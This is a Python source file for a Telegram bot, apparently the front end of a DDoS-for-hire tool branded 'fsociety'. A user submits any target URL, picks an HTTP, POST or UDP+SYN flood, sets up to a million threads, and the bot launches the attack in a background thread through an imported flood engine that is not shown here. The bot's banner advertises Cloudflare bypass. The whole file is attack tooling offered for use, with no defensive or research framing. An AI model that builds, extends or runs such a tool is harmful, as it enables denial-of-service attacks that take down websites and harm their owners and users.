import asyncio
import logging
import threading
import multiprocessing
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from attacks_v2 import DDoSEngineV2
import os

TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")

# Store attack processes
attacks = {}

MENU = InlineKeyboardMarkup([
    [InlineKeyboardButton("🔥 HTTP Flood (1M+)", callback_data='http'),
     InlineKeyboardButton("📦 POST Flood (1M+)", callback_data='post')],
    [InlineKeyboardButton("💀 UDP+SYN (brutal)", callback_data='udp_syn'),
     InlineKeyboardButton("🛑 STOP ALL ATTACKS", callback_data='stop')],
    [InlineKeyboardButton("⚙️ SET THREADS", callback_data='threads'),
     InlineKeyboardButton("📊 STATUS", callback_data='status')]
])

user_threads = {}  # user_id -> thread count

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "[fsociety] @z0nzy — DDoS Bot v2.0\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💀 1 MILLION THREADS SUPPORT\n"
        "🚀 Multiprocessing + Async + Threads\n"
        "🎯 Cloudflare Bypass Included\n\n"
        "📌 SEND TARGET URL:\n"
        "   https://example.com\n\n"
        "⚙️ DEFAULT THREADS: 50000\n"
        "   (use /threads 1000000 for 1M)\n\n"
        "🟢 BOT STAYS RESPONSIVE DURING ATTACK\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        reply_markup=MENU
    )

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if not url.startswith('http'):
        url = 'https://' + url
    context.user_data['target'] = url
    await update.message.reply_text(f"🎯 TARGET: {url}\n\n✅ Ready. Choose attack:", reply_markup=MENU)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    target = context.user_data.get('target')
    
    if query.data == 'stop':
        if user_id in attacks:
            attacks[user_id].stop()
            del attacks[user_id]
            await query.edit_message_text("🛑 ATTACK STOPPED.\n✅ Bot is still alive.")
        else:
            await query.edit_message_text("❌ No active attack found.")
        return
    
    if query.data == 'status':
        if user_id in attacks:
            await query.edit_message_text("🔥 ATTACK IS RUNNING\nUse STOP to halt.")
        else:
            await query.edit_message_text("💤 No active attack.")
        return
    
    if query.data == 'threads':
        await query.edit_message_text("📝 Send thread count (100 - 1000000)\nExample: 500000")
        context.user_data['waiting_threads'] = True
        return
    
    if not target:
        await query.edit_message_text("❌ Send target URL first!")
        return
    
    thread_count = user_threads.get(user_id, 50000)
    
    if query.data == 'udp_syn':
        await query.edit_message_text(
            f"💀 UDP+SYN FLOOD starting\n"
            f"🎯 {target}\n"
            f"🧵 Threads: {thread_count}\n"
            f"⚙️ Processes: {multiprocessing.cpu_count()}\n\n"
            f"✅ ATTACK RUNNING IN BACKGROUND\n"
            f"Bot is still responsive. Use STOP to halt."
        )
    else:
        method_name = "HTTP Flood" if query.data == 'http' else "POST Flood"
        await query.edit_message_text(
            f"⚔️ {method_name} started\n"
            f"🎯 {target}\n"
            f"🧵 Total threads: {thread_count}\n"
            f"⚙️ Parallel processes: {multiprocessing.cpu_count()}\n\n"
            f"✅ ATTACK RUNNING IN BACKGROUND\n"
            f"Bot is still responsive. Use STOP to halt."
        )
    
    # Start attack in separate process (does NOT block bot)
    engine = DDoSEngineV2(target, thread_count=thread_count)
    attacks[user_id] = engine
    
    # Run in a separate thread to not block asyncio
    def run_attack():
        if query.data == 'udp_syn':
            engine.start_full_attack('udp_syn')
        else:
            engine.start_full_attack(query.data)
    
    attack_thread = threading.Thread(target=run_attack)
    attack_thread.daemon = True
    attack_thread.start()

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.user_data.get('waiting_threads'):
        try:
            val = int(update.message.text.strip())
            if 100 <= val <= 1000000:
                user_threads[user_id] = val
                await update.message.reply_text(f"✅ Threads set to {val:,}")
            else:
                await update.message.reply_text("❌ Must be between 100 and 1,000,000")
        except:
            await update.message.reply_text("❌ Send a valid number")
        context.user_data['waiting_threads'] = False
        return
    
    # Otherwise treat as URL
    await handle_url(update, context)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("[fsociety] @z0nzy — Bot is LIVE")
    print(f"CPU Cores: {multiprocessing.cpu_count()}")
    print("Bot will NOT freeze during attacks")
    
    app.run_polling()

if __name__ == "__main__":
    # required for multiprocessing on some platforms
    multiprocessing.freeze_support()
    main()